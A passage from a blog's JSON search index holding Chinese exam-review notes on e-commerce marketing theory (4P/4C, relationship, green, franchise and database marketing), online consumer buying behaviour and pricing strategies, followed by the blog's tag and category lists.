利用网络营销，在制定产品的价格策略时同样要考虑市场因素。现在，很多厂商已经发现，通过因特网上的Web数据库行销时，可以把产品价格调整到更具竞争力的位置上，关键是如何正确地评估消费者对获取产品与服务的满足及价值的判断，网络资源如何被有效利用。 渠道（Place） 在传统市场的销售过程中，消费者购买商品的渠道很多，除了在商店购买外，还可以通过邮购、电话送货、产品直销、专柜销售。进入网络营销以后，消费者还可以通过网络下订货单购买产品。如何让消费者比以前更方便地购买商品和服务，以及让消费者获得与称心如意的服务是网络营销是否成功的关键。 推广（Promotion） 在产品展销会、贸易洽谈会泛滥成灾的岁月里，不时的有人提醒：“不要只是一昧的促销，应多考虑怎样与消费者沟通，引起消费者的共鸣。”这些建议谁也听不进去。市场真是变幻莫测，转眼之间由卖方市场转为买方市场，由生产主导型向需求满足型转变，营销由4P’s组合到4C’s组合转变，营销进入到一个新的阶段。如果说4P’s所代表的是以制造商为核心的商业世界观的话，那么4C’s所代表的就是以消费者为核心的商业世界观。 4.4c理论 舒尔兹等从消费者需求的角度出发研究市场营销理论，提出了4C组合，即整合营销(Integrated Marketing)理论 消费者需求（Consumer’s wants and needs） 满足需求的成本（Cost to satisfy wants and need） 便利购买（Convinience to buy） 实时沟通（Real-time Communication） 先不急于制定产品策略(product），先研究客户的利益(Customer benefit)、研究消费者的需求和欲望(Consumer‘s wants and needs)为中心，卖消费者想购买的产品。Dell公司。 暂时把定价策略(Price)放到一边，而研究客户为满足其需求所愿付出的成本(Customer Cost)，并依据该成本来组织生产和销售。通用汽车。 忘掉渠道策略(Place)，着重考虑怎样给消费者方便(Convenience)以购买到商品。 抛开促销策略(Promotion)，着重于加强与消费者沟通和交流(Communication)。 5.网络“软营销”理论 软营销(soft marketing)是有关消费者心理学的另一理论基础，它是针对工业经济时代以大规模生产为主要特征的“强式营销”提出的新理论,强调企业进行市场营销活动的同时必须尊重消费者的感受和体念，让消费者能舒服的主动接收企业的营销活动。 理论基础产生的根本原因是网络本身的特点和消费者个性化需求的回归。 网络“软”营销的特征主要体现在它从消费者的体验和需求出发，遵守网络礼仪的同时通过对网络礼仪的巧妙运用，采取拉式策略吸引消费者关注企业，从而获得一种微妙的营销效果。网络社区、BBS等的合理运用也能起到好的营销效果。 6.关系营销(Relationship Marketing) 通过加强与客户的联系，提供高度满意的产品和服务，将一次性交易关系转变到保持长期的交易关系上。达到与客户保持长期的关系。 说明： 企业的营销活动是一个与消费者、竞争者、供应商、分销商、政府机构和社会组织发生相互作用的过程，正确理解这些个人与组织的关系是企业营销的核心 关系营销的核心是保持客户 7.绿色营销 所谓绿色营销是指企业在生产经营过程中，将企业自身利益、消费者利益和环境保护利益三者统一起来，以此为中心，对产品和服务进行构思、设计、销售和制造。 说明： 也称生态营销：提供洁净的生产环境和安全的绿色产品、绿色包装、绿色服务满足社会的发展要求 着眼于企业的长期利益与永远发展，企业利益与社会利益协调一致共同发展 体现在4P上（绿色产品，产品价格反映绿色成本、绿色分销渠道、绿色促销） 8.特许营销 是指特许者（又称盟主）将拥有的知名品牌商品、成熟的系统管理模式、高素质的专业人才、成功的企业样板，以特许经营的形式授予被特许者使用，被特许者按合同支付相应的费用。特许者转让的是一整套已经被实践证明是成功的营销技巧和具有一定知名度、美誉度的品牌使用权。 说明：（例：饮食业、服装业、保健品业等） 稳定而优质的原辅材料来源； 独具特色的服务功能； 规范先进的训练指导能力； 持久有效的促销配合； 全面的信息支持； 健全完善的管理制度和科学地实施规则，特许经营才能取得成功。 9.另类营销 采用非集中或分散化的营销体制，把企业分成能够各自营销结果负责的自我营销单位，使其对市场环境的变化具有极大的灵活性、适应性、竞争性、最大限度地满足特定市场和特定顾客的需要，真正做到一件也做、一台也造、一套也卖。 特点： 最大限度的满足个性化消费的需要 10.文化营销 企业将自己的文化理念、社会理念、企业精神、价值观等内涵，通过企业文化的手段，潜移默化地灌输给消费者，达到一种文化认同的社会效果。 说明： 文化的涵括：群族的历史、地理、风土人情、传统习俗、工具、生活方式、宗教信仰、文学艺术、规范、律法、制度、思维方式、价值理念、审美情趣、精神图腾等。 文化营销企业营销的最高境界，它的目标是达到文化认同的社会效果。 文化营销的最大特点：造就一代又一代产品与服务的忠诚消费者和某种特定的生活方式。 企业产品或服务做为企业文化的载体，传递给消费者接受与认同。 11.数据库营销 数据库营销是是企业（商家）通过搜集和积累消费者大量的信息，经过对这些信息加工、处理，预测消费者有多大可能性购买某种产品，以及利用这些信息给产品精确定位，有针对性地制作营销方案，以期达到说服消费者去购买产品的目的。 作用： 准确找到目标消费者群，降低营销成本，提高营销效率， 使消费者成为企业长期、忠实的用户，企业稳定的顾客群。 为营销和新产品开发提供准确的信息。 提供直接的个性化报务。 企业与消费都建立联系。 优势： 可测度：你可以准确地知道客户反应以及这些反应来自何处，而这些信息将被用于继续、扩展或重新制定、调整你的营销计划。而传统的是模糊的，不确定的。 可测试性：数据库营销就像科学实验，每推进一步，都可以测试，其结果可以分析。 成本低、效率高 获得更多长期忠实客户 维持老客户是寻求新客户的0.5倍 失去的老客户成为新客户的成本是寻求一个新客户的10倍。 预测：运用储存的消费记录来推测未来消费者行为具有相当的准确性。 竞争隐蔽化：方案实施具有隐密性：不容易引起竞争对手的注意，推出对抗方案。 消费者行为模式 １、社会因素 社会因素有文化因素、相关群体因素 文化因素：文化通常是指人类在长期生活实践中建立起来的价值观、道德观及其他行为准则和生活习俗，是引发人们的愿望及行为的最根本因素，它对消费者行为的影响最广泛。通过对它的分析可预测消费者的市场行为。 亚文化因素：由于不同地区、不同民族而产生不同的亚文化人群。 相关群体：是指对消费者的态度和购买行为具有直接或间接影响的组织、团体和人群等。社会相关群体之间的相互影响也是消费者购买决策过程的重要参照。（家庭 、生活方式群体） ２、自身因素 不同的个体、个体所处的不同人生阶段，其购买意向和购买行为也是不同的 影响个体购买决策的因素主要有年龄、职业、地位、经济状况、受教育水平、生活方式、个性等 ３、购买动机 动机是一种内在的心理状态，不容易被直接观测，但它可以根据人们的长期行为表现或自我陈述加以了解和归纳。网络消费者的购买动机大体分为三类，即理智动机、感情动机及惠顾动机。 理智动机是建立在人们对于在线商场推销的商品的客观认识基础上的。他们的购买行为受控于理智，很少受外界影响，其购买行为受商品的适用性、价值、美感、安全性、可靠性以及交易过程的便捷性等因素影响。 感情动机是由人的情绪、情感所引起的购买动机。感情动机一般由求新、求名、从众等心理因素引起。 惠顾动机是基于理智和感情之上，对特定网站的产品或服务产生特殊的信任与偏好而重复地、习惯性地前往访问并购买的一种动机。形成惠顾动机的因素往往包括搜索引擎的便利、广告醒目、站点内容的吸引、价格、商标品牌的权威性、产品质量、设计、可靠的信誉、客户服务、支付配送、安全等。具有惠顾动机的消费者往往是网站的核心客户。 4. 5、网络消费者购买决策过程需求确认 网络消费者行为模式： 消费者首先要认识到自己需要某种商品后 消费者认识到自己的当前状态与理想状态的差距，这个差距就是消费者的需求 消费者需要满足这一需求从而达到消除差距的目的 信息收集－做出购买决策的基础： 获得信息的途径 通过相关群体获取所需信息 通过公共传媒如电视、广播、网络等 借助搜索引擎 直接访问某个著名网站 利用即时通软件 请求网友推荐 参与相关论坛 评价选择： 消费者在获得相关信息之后，制定相应的购买方案，并根据个人的特点，选择一种最适合自己的购买方案。 决定性因素是消费者评价与选择购买方案的主要因素（价格、品牌、质量等） 购买： 购买方案决定后，消费者的下一个任务就是完成购买行为 购后评价： 完成购买行为后，消费者会对购买过程特别是交易过程以及所获得的产品或服务进行评价 决定消费者对购买是否满意的关键在于消费者的期望和产品实际性能之间的关系 价格策略 与产品定价相关原因素 战略目标、市场定位、产品定位和产品特征。 定价依据： 企业内部-》生产成本 市场全局-》需求方的需求强弱、价值接收程度、其它同类产品或替代产品的竞争压力程度。 需求方接收价格的依据：商品的使用价值和商品的稀缺程度以及替代品的机会成本。 （一）低价定价策略 直接低价定价策略：成本＋利润（低利润或0利润） 折扣策略：原价X折扣率 低价定价策略应注意的问题： 网上不易销售客户对定价敏感，而商家又难以降价的产品。如黄金首饰类。 在网上发布价格时要针对不同的客户对象（消费者、零售商、批发商、合作伙伴）提供不同的信息发布渠道，以免造成混乱。 注意与同类价格比较后发布。 （二）定制生产定价策略 定制定价策略是在定制生产的基础上，利用网络技术及计算机软件，帮助消费者选择配置或自行设计满足自己需求的个性化产品，同时承担自己愿意付出的价格成本。 （三）许可使用定价策略 客户通过互联网注册后可以直接使用某公司的产品，客户根据使用的次数付费，而不需求将产品完全购买。 （四）拍卖竞价策略 通过互联网公开竞价，在规定时间内价高者赢得 拍卖竞价方式 网上竞价拍卖 竞价拍买 集体议价。 （五）免费价格策略 为了促销和推广产品所采取的一种短期和临时性的定价策略。","link":"/2019/06/27/电商营销/"}],"tags":[{"name":"GNS3","slug":"GNS3","link":"/tags/GNS3/"},{"name":"python","slug":"python","link":"/tags/python/"},{"name":"vs code","slug":"vs-code","link":"/tags/vs-code/"},{"name":"c/c++","slug":"c-c","link":"/tags/c-c/"},{"name":"软件分享","slug":"软件分享","link":"/tags/软件分享/"},{"name":"刺客信条","slug":"刺客信条","link":"/tags/刺客信条/"},{"name":"游戏","slug":"游戏","link":"/tags/游戏/"},{"name":"攻略","slug":"攻略","link":"/tags/攻略/"},{"name":"电商","slug":"电商","link":"/tags/电商/"},{"name":"VMware","slug":"VMware","link":"/tags/VMware/"},{"name":"kali linux","slug":"kali-linux","link":"/tags/kali-linux/"},{"name":"hping3","slug":"hping3","link":"/tags/hping3/"},{"name":"数据库","slug":"数据库","link":"/tags/数据库/"},{"name":"sql server","slug":"sql-server","link":"/tags/sql-server/"}],"categories":[{"name":"网络相关","slug":"网络相关","link":"/categories/网络相关/"},{"name":"python编程","slug":"python编程","link":"/categories/python编程/"},{"name":"code","slug":"code","link":"/categories/code/"},{"name":"软件分享","slug":"软件分享","link":"/categories/软件分享/"},{"name":"游戏攻略","slug":"游戏攻略","link":"/categories/游戏攻略/"},{"name":"期末复习","slug":"期末复习","link":"/categories/期末复习/"},{"name":"渗透测试","slug":"渗透测试","link":"/categories/渗透测试/"},{"name":"网络攻防","slug":"渗透测试/网络攻防","link":"/categories/渗透测试/网络攻防/"}]}